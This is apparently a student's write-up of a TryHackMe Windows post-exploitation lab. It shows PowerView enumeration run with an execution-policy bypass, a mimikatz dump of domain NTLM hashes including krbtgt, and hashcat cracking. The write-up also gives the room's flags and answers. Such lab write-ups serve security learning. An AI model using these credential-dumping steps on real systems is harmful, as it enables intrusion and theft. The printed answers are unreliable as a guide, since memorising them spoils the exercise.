# Post-Exploitation Basics
###URL : https://tryhackme.com/room/postexploit
### Why?

I am trying to get a better understanding of Windows Post-Exploitation basics and Enumeration.


## Task 2 | Enumeration w\ Powerview
First we start `powershell with -ep bypass` to bypass any executeable restrictions and load 
`PowerView.ps1`
Simple Cheatsheet for Powerview here: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

After that its asking us to enumerate a few things on the system;

First; the Domain Users:
`Get-Netuser | select on`

```
PS C:\Users\Administrator> Get-Netuser | select cn

cn
Administrator
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW}
sshd
```
This gives us a nice list of Users (Also probably a Flag for a future question).

Then it asks us to Enumerate the Domain Groups with `Get-NetGroup -GroupName *admin*`

```
PS C:\Users\Administrator> Get-NetGroup -GroupName *admin*
Administrators
Hyper-V Administrators
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins
DnsAdmins
```

Then a real question

#### What is the shared Folder that is not set by Default.
We can find this by looking at the shares; this can be done with `Invoke-Sharefinder`

```
PS C:\Users\Administrator> Invoke-Sharefinder
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin
\\Domain-Controller.CONTROLLER.local\C$         - Default share
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
```
We can tell here that "\Share" is not a normal share, and is correct.


### What operating system is running inside of the network besides Windows Server 2019?
For this we need another command that is provided in the hints: `Get-NetComputer -fulldata | select operatingsystem`
```
PS C:\Users\Administrator> Get-NetComputer -fulldata | select operatingsystem

operatingsystem
---------------
Windows Server 2019 Standard
Windows 10 Enterprise Evaluation 
Windows 10 Enterprise Evaluation
```

### I've hidden a flag inside of the users find it

From the list above, we can see a User Flag "hidden" in the userlist. `Get-Netuser | select cn`

## Task 3 | Enumeration w/ Bloodhound
Now, we have to setup Bloodhound on our Kali Box; Unfortunately it didnt run out of the box (neo4j doesnt run by default.)

Unfortunately, SharpHound / Bloodhound lost compatibility with eachother when using the Sharphound... 
Lets try updating/upgrading our local Kali VM first.

## Task 4 | Enumeration w/ mimikatz
Lets see what we can do with Mimikatz. The binary is already pre-loaded so lets execute within our ssh connection and see what we got.
We run mimikatz.exe in the ./Downloads/ folder and then first we check if mimikatz is started with the appriate user.

```
mimikatz # privilege::debug 
Privilege '20' OK 
```

After this is confirmed, we can move on to "Dump those hashes".

```
mimikatz # lsadump::lsa /patch 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 5508500012cc005cf7082a9a89ebdfdf

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000454 (1108)
User : POST
LM   :
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2 

RID  : 00000457 (1111)
User : sshd
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000003e8 (1000)
User : DOMAIN-CONTROLL$
LM   :
NTLM : 87ddcbe804e45129e508ed49d9e72402

RID  : 00000455 (1109)
User : DESKTOP-2$
LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

RID  : 00000456 (1110)
User : DESKTOP-1$
LM   :  
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a
```
This gives us a list of NTLM hashes we can crack using hashcat.

First we crack our own Hash:
```
hashcat -m 1000 2777b7fec870e04dda00cd7260f7bee6 /usr/share/wordlists/rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

2777b7fec870e04dda00cd7260f7bee6:P@$$W0rd                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 2777b7fec870e04dda00cd7260f7bee6
Time.Started.....: Wed Sep  7 08:42:09 2022 (4 secs)
Time.Estimated...: Wed Sep  7 08:42:13 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3003.2 kH/s (0.15ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10762240/14344385 (75.03%)
Rejected.........: 0/10762240 (0.00%)
Restore.Point....: 10760192/14344385 (75.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: PAKITHUG -> P229Grandpa
Hardware.Mon.#1..: Util: 61%
```

### what is the Machine1 Password?
Then to answer the actual question; we have to crack "Machine 1"'s hash.

`hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt` gives us the answer we need

### What is the Machine2 Hash?
We can easily find this in the list above.